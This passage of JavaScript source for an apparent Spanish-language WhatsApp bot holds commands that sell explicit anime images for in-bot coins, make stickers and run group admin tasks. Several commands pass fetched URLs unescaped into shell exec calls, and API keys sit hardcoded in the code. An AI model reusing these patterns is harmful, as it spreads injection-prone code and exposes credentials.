			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('E-error ⊙﹏⊙')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				reply('Se te cobraron 30 coins')
				fs.unlinkSync(rano)
			})
			addFilter(from)
          break		
case prefix+'pwankg':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 const uaangkauruiru = checkATMuser(sender)
const jmocoo = [`${uaangkauruiru}`]
if (jmocoo < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/pwankg')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('E-error ⊙﹏⊙')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				reply('Se te cobraron 30 coins')
				fs.unlinkSync(rano)
			})
			addFilter(from)
          break
case prefix+'ero1':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 const uaangkaumrru = checkATMuser(sender)
const jmuoo = [`${uaangkaumrru}`]
if (jmuoo < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)
			eronz = await axios.get('https://nekos.life/api/v2/img/eron')
			buferon = await getBuffer(eronz.data.url)
			cnf.sendMessage(from, buferon, image, { quoted: mek, caption: 'Se te cobraron 30 coins'})
			.catch(err => {
			return('E-error ⊙﹏⊙')
			})
			addFilter(from)
          break

case prefix+'ero2':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 const uaangkaurmru = checkATMuser(sender)
const jmomo = [`${uaangkaurmru}`]
if (jmomo < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

			eroz = await axios.get('https://nekos.life/api/v2/img/ero')
			bufero = await getBuffer(eroz.data.url)
			cnf.sendMessage(from, bufero, image, { quoted: mek, caption: 'Se te cobraron 30 coins'})
			.catch(err => {
			return('E-error vuelve a intentar ⊙﹏⊙')
			})
			addFilter(from)
          break

case prefix+'holoero':
if (isBanned) return  reply(mess.banned)          
if (!isRegistered) return reply(ind.noregis())			  
 const uaangkaullu = checkATMuser(sender)
const joda = [`${uaangkaullu}`]
if (joda < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)
		holox = await axios.get('https://nekos.life/api/v2/img/holoero')
			bufholox = await getBuffer(holox.data.url)
			cnf.sendMessage(from, bufholox, image, { quoted: mek, caption: 'Se te cobraron 30 coins'})
			.catch(err => {
			return('Error 7-7..')
			})
			addFilter(from)
          break
          
case prefix+'cum':
if (isBanned) return  reply(mess.banned)        
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
 const uaangkaukku = checkATMuser(sender)
const jodas = [`${uaangkaukku}`]
if (jodas < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/cum')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			addFilter(from)
          break

case prefix+'antilink':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('Ya estaba activo!')
						antilink.push(from)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Se activo con exito ✔️️')
					} else if (Number(args[0]) === 0) {
						antilink.splice(from, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('Se desactivo con éxito la función de bienvenida en este grupo (・o・)️')
					} else {
						reply('1 para activar, 0 para desactivar')
					}
                    addFilter(from)
          break

case prefix+'toimg':
if (isBanned) return  reply(mess.banned)          
if (!isRegistered) return reply(ind.noregis())			  
			if (!isQuotedSticker) return reply('Responde a un sticker!')
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await cnf.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.png')
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply('Hubo un fallo, por favor intentalo de nuevo ')
			buffer = fs.readFileSync(ran)
			fakethumb(buffer,'Aquí tienes 💕🦈')
			fs.unlinkSync(ran)
			})
			addFilter(from)
          break

case prefix+'getpic':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
				if (mek.message.extendedTextMessage != undefined){
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await cnf.getProfilePicture(mentioned[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					thumb = await getBuffer(pic)
					cnf.sendMessage(from, thumb, MessageType.image, {quoted: mek, caption: `Aquí tienes 💕🦈`})}
				addFilter(from)
          break

case prefix+'shutdown':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isGroupAdmins) return reply(mess.only.admin)
	        await cnf.sendMessage(from, `Bye...\n_🌸Watame-BOT🌸 apagandose..._`, text,{quoted : freply})
		await sleep(3000)
                cnf.close()
		addFilter(from)
          break
				
case prefix+'getbio':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
	    
		if (!isGroupAdmins) return reply(mess.only.admin)
                var yy = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                var p = await cnf.getStatus(`${yy}`, MessageType.text)
                reply(p.status)
                if (p.status == 401) {
                reply("No tiene Biografía /.\ ")
                }
                addFilter(from)
          break
				
case prefix+'attp':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())

				if (args.length < 1) return reply(`¿Y el texto? Ù.Ú\n*Ejemplo ${prefix}attp Monogatari*`)
				attp2 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${body.slice(6)}`)
				cnf.sendMessage(from, attp2, sticker, {quoted: freply})
				addFilter(from)
          break 
						  					  
				case prefix+'sticker':
				if (isBanned) return  reply(mess.banned)
				if (!isRegistered) return reply(ind.noregis())
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await cnf.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.stick)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								cnf.sendMessage(from, buff, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await cnf.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`❌ Error`)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								cnf.sendMessage(from, buff, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await cnf.downloadAndSaveMediaMessage(encmedia)
						ranw = getRandom('.webp')
						ranp = getRandom('.png')
						keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
						await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg.result, size: 'auto', type: 'auto', ranp}).then(res => {
							fs.unlinkSync(media)
							let buffer = Buffer.from(res.base64img, 'base64')
							fs.writeFileSync(ranp, buffer, (err) => {
								if (err) return reply('Error')
							})
							exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
								fs.unlinkSync(ranp)
								if (err) return reply(mess.error.stick)
								buff = fs.readFileSync(ranw)
								cnf.sendMessage(from, buff, sticker, {quoted: mek})
							})
						})
					/*} else if ((isMedia || isQuotedImage) && colors.includes(args[0])) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await cnf.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.on('start', function (cmd) {
								console.log('Started :', cmd)
							})
							.on('error', function (err) {
								fs.unlinkSync(media)
								console.log('Error :', err)
							})
							.on('end', function () {
								console.log('Finish')
								fs.unlinkSync(media)
								buff = fs.readFileSync(ran)
								cnf.sendMessage(from, buff, sticker, {quoted: mek})
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=${args[0]}@0.0, split [a][b]; [a] palettegen=reserve_transparent=off; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)*/
					} else {
						reply(`Etiqueta una imagen oh video`)
					}
					addFilter(from)
					addFilter(from)
          break
					
case prefix+'ping':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
	  
uptime = process.uptime()
const timestampi = speed();
const latensip = speed() - timestampi
			             anjink =`◪ Encendido
├ *Nombre : 🌸Watame-BOT🌸*
├ *Runtime :*
├  ${kyun(uptime)}
├ *Speed :*
├  ${latensip.toFixed(4)} Second
└─────────────`
			             cnf.sendMessage(from, anjink, text,{quoted : freply})
			           addFilter(from)
          break
			           case prefix+'info':
			           if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
  me = cnf.user
  uptime = process.uptime()
  teks = `┌─────┤𝐈𝐍𝐅𝐎├─────
├‣ *Nombre* : 
├‣🌸Watame-BOT🌸
│
├‣ *Número del bot* : 
├‣@${me.jid.split('@')[0]}
│
├‣ *Dueño* : 🔰Manuel🔰 
├‣ *Prefijo* : ${prefix}
│
├‣ *Tiempo activo* : 
├‣${kyun(uptime)}
│
├‣ *Total de chats* : 
├‣${totalchat.length}
└─────────────`
  weww = fs.readFileSync(`./media/cnf.jpeg`)
  cnf.sendMessage(from, weww, image, {
caption: teks, contextInfo: {
  mentionedJid: [me.jid]}})
  addFilter(from)
          break

case  prefix+'nekopoi':          
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
    const nekito = checkATMuser(sender)
const nekos = [`${nekito}`]
if (nekos < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)  
       ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/nsfw_neko_gif')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('error')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			addFilter(from)
          break 

case  'futanari':       
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
 const uaangkauoou = checkATMuser(sender)
const joj = [`${uaangkauoou}`]
if (joj < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)
			futan = await axios.get('https://nekos.life/api/v2/img/futanari')
			futanz = await getBuffer(futan.data.url)
			cnf.sendMessage(from, futanz, image, { quoted: mek, caption: 'Se te cobraron 30 coins'})
			addFilter(from)
          break

case prefix+'poke':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
      ranp = getRandom('.gif')
      rano = getRandom('.webp')
			anu = await axios.get('https://nekos.life/api/v2/img/poke')
			exec(`wget ${anu.data.url} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			  fs.unlinkSync(ranp)
				if (err) return reply('E-error ⊙﹏⊙')
				buffer = fs.readFileSync(rano)
				cnf.sendMessage(from, buffer, MessageType.sticker, {quoted: mek})
				fs.unlinkSync(rano)
			})
			addFilter(from)
          break

case prefix+'trap':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 const traps = checkATMuser(sender)
const trap1 = [`${traps}`]
if (trap1 < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

			trapss = await axios.get('https://nekos.life/api/v2/img/trap')
			traps2 = await getBuffer(trapss.data.url)
			cnf.sendMessage(from, traps2, image, { quoted: mek, caption: 'Se te cobraron 30 coins'})
			.catch(err => {
			return('E-error ⊙﹏⊙')
			})
			addFilter(from)
          break
			
					case prefix+'gay':
					if (isBanned) return  reply(mess.banned)	
                    if (!isRegistered) return reply(ind.noregis())
                    
					const gay =['Eres 0% gay' , 'Eres 1% gay' , 'Eres 2% gay' , 'Eres 3% gay' , 'Eres 4% gay' , 'Eres 5% gay' , 'Eres 6% gay' , 'Eres 7% gay' , 'Eres 8% gay' , 'Eres 9% gay' , 'Eres 10% gay' , 'Eres 11% gay' , 'Eres 12% gay' , 'Eres 13% gay' , 'Eres 14% gay' , 'Eres 15% gay' , 'Eres 16% gay' , 'Eres 17% gay' , 'Eres 18% gay' , 'Eres 19% gay' , 'Eres 20% gay' , 'Eres 21% gay' , 'Eres 22% gay' , 'Eres 23% gay' , 'Eres 24% gay' , 'Eres 25% gay' , 'Eres 26% gay' , 'Eres 27% gay' , 'Eres 28% gay' , 'Eres 29% gay' , 'Eres 30% gay' , 'Eres 31% gay' , 'Eres 32% gay' , 'Eres 33% gay' , 'Eres 34% gay' , 'Eres 35% gay' , 'Eres 36% gay' , 'Eres 37% gay' , 'Eres 38% gay' , 'Eres 39% gay' , 'Eres 40% gay' , 'Eres 41% gay' , 'Eres 42% gay' , 'Eres 43% gay' , 'Eres 44% gay' , 'Eres 45% gay' , 'Eres 46% gay' , 'Eres 47% gay' , 'Eres 48% gay' , 'Eres 49% gay' , 'Eres 50% gay' , 'Eres 51% gay' , 'Eres 52% gay' , 'Eres 53% gay' , 'Eres 54% gay' , 'Eres 55% gay' , 'Eres 56% gay' , 'Eres 57% gay' , 'Eres 58% gay' , 'Eres 59% gay' , 'Eres 60% gay' , 'Eres 61% gay' , 'Eres 62% gay' , 'Eres 63% gay' , 'Eres 64% gay' , 'Eres 65% gay' , 'Eres 66% gay' , 'Eres 67% gay' , 'Eres 68% gay' , 'Eres 69% gay' , 'Eres 70% gay' , 'Eres 71% gay' , 'Eres 72% gay' , 'Eres 73% gay' , 'Eres 74% gay' , 'Eres 75% gay' , 'Eres 76% gay' , 'Eres 77% gay' , 'Eres 78% gay' , 'Eres 79% gay' , 'Eres 80% gay' , 'Eres 81% gay' , 'Eres 82% gay' , 'Eres 83% gay' , 'Eres 84% gay' , 'Eres 85% gay' , 'Eres 86% gay' , 'Eres 87% gay' , 'Eres 88% gay' , 'Eres 89% gay' , 'Eres 90% gay' , 'Eres 91% gay' , 'Eres 92% gay' , 'Eres 93% gay' , 'Eres 94% gay' , 'Eres 95% gay' , 'Eres 96% gay' , 'Eres 97% gay' , 'Eres 98% gay' , 'Eres 99% gay' , 'Eres 100% gay']									
					const gai = gay[Math.floor(Math.random() * gay.length)]
								wiw = fs.readFileSync(`./src/8.jpg`)
										cnf.sendMessage(from, wiw, image, { quoted: mek, caption: '*Que tan gay eres*\n\n'+ gai })
									addFilter(from)
          break
			
			
case prefix+'foxgirl':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 const breast1 = checkATMuser(sender)
const jmokiuo0 = [`${breast1}`]
if (jmokiuo0 < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

			breast2 = await axios.get('https://nekos.life/api/v2/img/fox_girl')
			bupboobs = await getBuffer(breast2.data.url)
			cnf.sendMessage(from, bupboobs, image, { quoted: mek, caption: 'Se te cobraron 30 coins'})
			.catch(err => {
			return('E-error ⊙﹏⊙')
			})
			addFilter(from)
          break

case prefix+'blowjob':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 const breast1o = checkATMuser(sender)
const jmoki0 = [`${breast1o}`]
if (jmoki0 < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

			breast20 = await axios.get('https://nekos.life/api/v2/img/blowjob')
			bupboobs1 = await getBuffer(breast20.data.url)
			cnf.sendMessage(from, bupboobs1, image, { quoted: mek, caption: 'Se te cobraron 30 coins'})
			.catch(err => {
			return('E-error ⊙﹏⊙')
			})
			addFilter(from)
          break
	
case prefix+'hentai':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
 const hentai1 = checkATMuser(sender)
const hentai2 = [`${hentai1}`]
if (hentai2 < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)

			h100 = await axios.get('https://nekos.life/api/v2/img/hentai')
			rule34 = await getBuffer(h100.data.url)
			cnf.sendMessage(from, rule34, image, { quoted: mek, caption: 'Se te cobraron 30 coins'})
			.catch(err => {
			return('E-error ⊙﹏⊙')
			})
			addFilter(from)
          break

case prefix+'patas':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
 const uaangkaxuu = checkATMuser(sender)
const jou = [`${uaangkaxuu}`]
if (jou < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)
							res = await fetchJson(`https://meme-api.herokuapp.com/gimme/animefeets`, {method: 'get'})
							buffer = await getBuffer(res.url)
							cnf.sendMessage(from, buffer, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})
				   addFilter(from)
          break  
        
        case prefix+'hidetag':
        if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
					if (!isGroup) return reply(mess.only.group)
					
					if (!isGroupAdmins) return reply(mess.only.admin)
					var value = body.slice(9)
					var group = await cnf.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: freply
					}
					cnf.sendMessage(from, options, text,{quoted : freply})
					addFilter(from)
          break

					case prefix+'ahegao':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
 const uaangkauopou = checkATMuser(sender)
const jouuy = [`${uaangkauopou}`]
if (jouuy < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30)
							res = await fetchJson(`https://meme-api.herokuapp.com/gimme/ahegao`, {method: 'get'})
							buffer = await getBuffer(res.url)
							cnf.sendMessage(from, buffer, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})
						
						addFilter(from)
          break

					case prefix+'thighs':
					if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  
const uaangkauolou = checkATMuser(sender)
const jojjj = [`${uaangkauolou}`]
if (jojjj < 30) return reply(`𝐋𝐨 𝐬𝐢𝐞𝐧𝐭𝐨 𝐜𝐨𝐢??𝐬 𝐢𝐧𝐬𝐮𝐟𝐢𝐜𝐢𝐞𝐧𝐭𝐞𝐬.`)
confirmATM(sender, 30)
							res = await fetchJson(`https://meme-api.herokuapp.com/gimme/animethighss`, {method: 'get'})
							buffer = await getBuffer(res.url)
							cnf.sendMessage(from, buffer, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})
						
						addFilter(from)
          break

							        case prefix+'linkgroup':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())			  
				    if (!isGroup) return reply(mess.only.group)
				    if (!isGroupAdmins) return reply(mess.only.admin)
				    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				    linkgc = await cnf.groupInviteCode (from)
				    yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink del grupo : *${groupName}*`
				    cnf.sendMessage(from, yeh, text, {quoted: freply})
			        addFilter(from)
          break
			       
        case prefix+'grupo':
	if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
							     if (!isGroupAdmins) return reply(mess.only.admin)		
					if (args[0] === 'abrir') {
					    reply(`\`\`\`✓abierto con éxito\`\`\` *${groupMetadata.subject}*`)
						cnf.groupSettingChange(from, GroupSettingChange.messageSend, false)
					} else if (args[0] === 'cerrar') {
						reply(`\`\`\`✓cerrado con éxito\`\`\` *${groupMetadata.subject}*`)
						cnf.groupSettingChange(from, GroupSettingChange.messageSend, true)
					}
					addFilter(from)
          break
					
					case prefix+'chatlist':
				if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	

		  if (!isGroupAdmins) return reply(mess.only.admin)
					cnf.updatePresence(from, Presence.composing)
					cnf.sendMessage(from, `Total : ${totalchat.length} Chat`, text, {quoted  : freply})
					addFilter(from)
          break
				
				case prefix+'listadmin':
				if (isBanned) return  reply(mess.banned)
                if (!isRegistered) return reply(ind.noregis())			  
			    if (!isGroup) return reply(mess.only.group)
					teks = `Lista de facheritos *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					addFilter(from)
          break
					
					case prefix+'promote':
				if (isBanned) return  reply(mess.banned)  
                if (!isRegistered) return reply(ind.noregis())			  
			    if (!isGroupAdmins) return reply(mess.only.admin)
				if (!isGroup) return reply(mess.only.group)
				if (!isBotGroupAdmins) return reply(mess.only.Badmin)
				if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadi admin!')
				mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				if (mentioned.length > 1) {
				teks = 'Pedido recibido, te conviertes en administrador! :\n'
				for (let _ of mentioned) {
				teks += `@${_.split('@')[0]}\n`
				}
				mentions(teks, mentioned, true)
				cnf.groupMakeAdmin(from, mentioned)
			    } else {
				mentions(`Ahora eres admin U~U @${mentioned[0].split('@')[0]}`)
				cnf.groupMakeAdmin(from, mentioned)
				}
				addFilter(from)
          break

                 case prefix+'demote':
			     if (isBanned) return  reply(mess.banned)
                 if (!isRegistered) return reply(ind.noregis())			  
			     if (!isGroupAdmins) return reply(mess.only.admin)
			     if (!isGroup) return reply(mess.only.group)
			     if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			     if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
				mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				if (mentioned.length > 1) {
				teks = 'Pedido recibido, ya no eres administrador :\n'
				for (let _ of mentioned) {
				teks += `@${_.split('@')[0]}\n`
				}
				mentions(teks, mentioned, true)
				cnf.groupDemoteAdmin(from, mentioned)
				} else {
				mentions(`Okey ya no eres admin ~ UnU @${mentioned[0].split('@')[0]}`, mentioned, true)
				cnf.groupDemoteAdmin(from, mentioned)
				}
				addFilter(from)
          break

case prefix+'halloween':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())		

	  
 const loluaangkauuuuuu = checkATMuser(sender)
const loljñññño = [`${loluaangkauuuuuu}`]
if (loljñññño < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30) 	
	confu = args.join(' ')
	if (args.length < 1) return reply('En dónde está el texto?')
      if (args.length > 10) return reply('Maximo 10 letras')
	sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/halloween?text=${confu}&apikey=Ikyy69`)
reply('Se te cobraron 30 coins')
      addFilter(from)
          break
      
      case prefix+'vampire':
      if (isBanned) return  reply(mess.banned)
      if (!isRegistered) return reply(ind.noregis())		
      	  
      
      const tuaangkauuuuuuu = checkATMuser(sender)
      const tjññññño = [`${tuaangkauuuuuuu}`]
      if (tjññññño < 30) return reply(`Lo siento, coins insuficientes`)
      confirmATM(sender, 30) 	
      confu = args.join(' ')
      if (args.length < 1) return reply('En dónde está el texto?')
      if (args.length > 10) return reply('Maximo 10 letras')
      piro = sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${confu}&apikey=Ikyy69`)
      if (piro.error) return reply(piro.error)
reply('Se te cobraron 30 coins')
      addFilter(from)
          break  
      
      case prefix+'codetxt':
      if (isBanned) return  reply(mess.banned)   	        
      if (!isRegistered) return reply(ind.noregis())		
      	 
       
      const wuaangkauuuuuuuu = checkATMuser(sender)
      const wjñññññño = [`${wuaangkauuuuuuuu}`]
      if (wjñññññño < 30) return reply(`𝐋𝐨 𝐬𝐢𝐞𝐧𝐭𝐨 𝐜𝐨𝐢𝐧𝐬 𝐢𝐧𝐬𝐮𝐟𝐢??𝐢𝐞𝐧𝐭𝐞𝐬.`)
      confirmATM(sender, 30) 	
      confu = args.join(' ')
      if (args.length < 1) return reply('En dónde está el texto?')
      if (args.length > 10) return reply('Maximo 10 letras')
      sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=${confu}&apikey=Ikyy69`)
      reply('Se te cobraron 30 coins')
      addFilter(from)
          break
				
	  case prefix+'express':
	  if (isBanned) return  reply(mess.banned)
      if (!isRegistered) return reply(ind.noregis())		
      	  
      
      const uaangkauuuumuuu = checkATMuser(sender)
      const jññññmño = [`${uaangkauuuumuuu}`]
      if (jññññmño < 30) return reply(`Lo siento, coins insuficientes`)
      confirmATM(sender, 30) 	 
      confu = args.join(' ')
      if (args.length < 1) return reply('En dónde está el texto?')
      if (args.length > 10) return reply('Maximo 10 letras')
	  sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${confu}&apikey=Ikyy69`)
	  reply('Se te cobraron 30 coins')
	  addFilter(from)
          break
				
	  case prefix+'dance':
	  if (isBanned) return  reply(mess.banned)            
      if (!isRegistered) return reply(ind.noregis())	
      	
      	  
      const uaangkauuuuiuuu = checkATMuser(sender)
      const jñññññuo = [`${uaangkauuuuiuuu}`]
      if (jñññññuo < 30) return reply(`Lo siento, coins insuficientes`)
      confirmATM(sender, 30) 		
	  confu = args.join(' ')
	if (args.length < 1) return reply('En dónde está el texto?')
    if (args.length > 10) return reply('Maximo 10 letras')
	  sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${confu}&apikey=Ikyy69`)
	  reply('Se te cobraron 30 coins')	
	  addFilter(from)
          break
				
	  case prefix+'blackbird':
	  if (isBanned) return  reply(mess.banned)        
